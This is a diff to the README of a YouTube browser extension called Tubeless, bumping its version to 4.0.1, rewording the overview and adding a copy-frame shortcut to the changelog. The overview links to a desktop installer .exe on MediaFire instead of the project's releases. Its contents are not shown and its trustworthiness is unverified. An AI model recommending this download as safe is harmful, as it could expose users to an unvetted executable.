@@ -14,7 +14,7 @@
 
 <p align="center">
   <a href="https://github.com/qalva/tubeless/releases/latest"><img src="https://img.shields.io/badge/download-latest-orange.svg" /></a>
-  <img src="https://img.shields.io/badge/version-4.0.0-blue.svg" />
+  <img src="https://img.shields.io/badge/version-4.0.1-blue.svg" />
   <img src="https://img.shields.io/badge/license-MIT-green.svg" />
 </p>
 
@@ -22,7 +22,7 @@
 
 ## Overview
 
-Tubeless is a browser extension that transforms YouTube into a focused workspace with advanced ad blocking, dislike restoration, and high-speed downloads via <a href="https://www.mediafire.com/file/vi8tolbhgvq2974/TubelessSetup-1.0.1.exe/file" target="_blank">Tubeless Desktop</a> — all local, with zero telemetry.
+The extension transforms YouTube into a focused workspace. Features advanced ad-blocking, dislike restoration, and high-speed downloads via <a href="https://www.mediafire.com/file/vi8tolbhgvq2974/TubelessSetup-1.0.1.exe/file" target="_blank">Tubeless Desktop</a>, all running locally with zero telemetry.
 
 ---
 
@@ -48,6 +48,7 @@ Tubeless is a browser extension that transforms YouTube into a focused workspace
 8. [Disclaimer](#disclaimer)
 9. [Architecture](#architecture)
 10. [Changelog](#changelog)
+    - [[4.0.1] - 2026-05-17](#401---2026-05-17)
     - [[4.0.0] - 2026-05-15](#400---2026-05-15)
     - [[3.0.1] - 2026-05-15](#301---2026-05-15)
     - [[3.0.0] - 2026-05-14](#300---2026-05-14)
@@ -251,6 +252,11 @@ Event-driven, modular, performance-first design.
 ---
 
 ## Changelog
+
+### [4.0.1] - 2026-05-17
+
+### Added
+- Ctrl + C Copy Frame: Added standard keyboard shortcut (`Ctrl + C` / `Cmd + C`) to instantly copy the video frame to the clipboard without triggering a download (with smart typing and text selection safety rules).
 
 ### [4.0.0] - 2026-05-15
 
